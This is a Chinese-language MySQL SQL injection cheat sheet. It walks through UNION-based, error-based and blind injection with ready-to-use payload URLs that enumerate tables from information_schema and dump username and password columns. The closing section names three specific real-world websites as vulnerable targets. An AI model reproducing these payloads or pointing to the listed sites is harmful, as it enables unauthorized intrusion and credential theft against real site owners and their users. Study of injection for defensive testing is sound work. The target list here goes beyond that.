## 0x00 Mysql UNION Injection
判断注入点 (数字型)：

- www.example.com/xxx.php?id=1
- www.example.com/xxx.php?id=1' -> 不正常，则可能存在注入

确定注入点：

- www.example.com/xxx.php?id=1 and 1=1 -> 页面正常
- www.example.com/xxx.php?id=1 and 1=2 -> 页面异常
- **到这里可以确定存在注入点**

确定列数：

- www.example.com/xxx.php?id=1 order by 1 -> 正常
- www.example.com/xxx.php?id=1 order by 2 -> 正常
- ……
- ……
- www.example.com/xxx.php?id=1 order by 6 -> 错误
- **则查询的列数为5**

确认UNION查询是否可用：

- www.example.com/xxx.php?id=1 and 1=2 union select 1,2,3,4,5,6
- **如果页面有回显1,2,3,4,5,6中的任意一个，则可以用union查询，下面假设回显数字为1**

确认mysql版本：

- www.example.com/xxx.php?id=1 and 1=2 union select version(),2,3,4,5,6
- **如果mysql的版本为5.0以上则可以使用information_schema数据库来注入，如果版本低于5.0，就只能暴力猜解**

mysql5.0以上版本注入方法：

1. 获取当前数据库中的表
    - www.example.com/xxx.php?id=1 and 1=2 union select group_concat(table_name) from information_schema.tables where table_schema=database()
2. 获取某张表中的列
	- www.example.com/xxx.php?id=1 and 1=2 union select group_concat(column_name) from information_schema.columns where table_name=0x75736572
	- 表名的十六进制，这里是user
3. 获取数据
	- www.site.com/xxx.php?id=1 and 1=2 union select 1,concat(user,0x3a,pass,0x3a,id),3,4,5,6 from user
	- **这里及下面的 `0x3a` 为分隔符
字符型注入：
- www.example.com/xxx.php?city=nanjing' and '1'='1 -> 正常
- www.example.com/xxx.php?city=nanjing' and '1'='2 -> 异常
- **则说明存在注入点，以下步骤同数字型注入**

## 0x01 mysql error-based injection

**原理：**此种注入使用union查询没有回显数据，在有报错的情况下利用报错信息来获取数据

**利用思路：**当 group by 的字段不一样而查询结果已有一个，如查询 count(), sum() 时会报错 "Duplicate entry xxx from 'group_key'"

**利用例句：**

- select count(*),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a
- 或
- select sum(version),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a
- 报错信息：[Err] 1062 - Duplicate entry '5.5.28:2' for key 'group_key'
- 获取当前数据表名的语句：
    -  `www.site.com/xxx.php?id=1 and (select 1 from (select sum(version),CONCAT((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a)b)`

## 0x02 mysql blind injection

**原理：** 此种注入既不报错，union查询也不回显，所以只能通过页面的不同返回情况来注入。  
**利用思路：** 充分利用数据库本身提供的函数，如 :ascii() substr() if（）   

例如，获取当前数据库名第一位的一种payload  

```mysql
select ascii(substr(database(),1,1)) from information_schema.tables limit 0,1

```   
继续利用 
```mysql
www.site.com/xxx.php?id=1  and (select if((payload)>99,1,0))  -> 返回正确 
www.site.com/xxx.php?id=1  and (select if((payload)>100,1,0))  -> 返回正确 
www.site.com/xxx.php?id=1  and (select if((payload)>101,1,0))  -> 返回错误 
```

则数据库第一位为 e（对应的ascii为101） 照此可以拿到所有想要的信息

## 0x03 几个有漏洞的站点
- http://www.burkemarine.com.au/category.php?cat_id=1 
- http://www.cideko.com/pro_con.php?id=3 
- http://www.vinayras.com/spider/diff.php?idd=518